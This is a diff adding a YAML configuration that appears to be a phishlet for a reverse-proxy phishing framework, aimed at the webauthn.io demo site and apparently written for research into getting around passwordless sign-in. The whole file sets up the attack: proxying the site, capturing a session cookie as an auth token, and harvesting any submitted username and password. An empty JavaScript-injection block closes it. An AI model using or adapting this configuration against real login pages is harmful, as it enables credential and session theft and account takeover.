@@ -1,0 +1,25 @@
+name: 'o365whfb'
+author: 'Yehuda Smirnov'
+min_ver: '3.1.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'webauthn.io', session: true, is_landing: true, auto_filter: true}
+auth_tokens:
+  - domain: '.webauthn.io'
+    keys: ['XY:always']
+    type: 'cookie'
+credentials:
+  username:
+    key: '(login|UserName)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd|Password|accesspass)'
+    search: '(.*)'
+    type: 'post'  
+login:
+  domain: 'webauthn.io'
+  path: '/'
+js_inject:
+  - trigger_domains: ["webauthn.io"]
+    trigger_paths: [".*"]
+    script: |
